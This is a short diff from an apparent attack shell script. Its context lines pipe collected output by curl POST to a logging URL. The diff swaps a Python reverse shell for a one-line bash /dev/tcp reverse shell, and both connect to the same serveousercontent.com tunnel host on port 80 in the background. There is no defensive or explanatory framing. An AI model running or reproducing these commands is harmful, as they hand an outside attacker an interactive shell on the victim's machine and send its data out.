@@ -15,5 +15,4 @@ SHELL_HOST="2bf41840cd5a5d42-103-95-173-85.serveousercontent.com"
   sleep 2
 } | curl -X POST -H "Content-Type: text/plain" --data-binary @- "$LOG_URL"
 
-# Launching Reverse Shell to the Second URL
-python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$SHELL_HOST',80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')" &
+bash -i >& /dev/tcp/2bf41840cd5a5d42-103-95-173-85.serveousercontent.com/80 0>&1 &
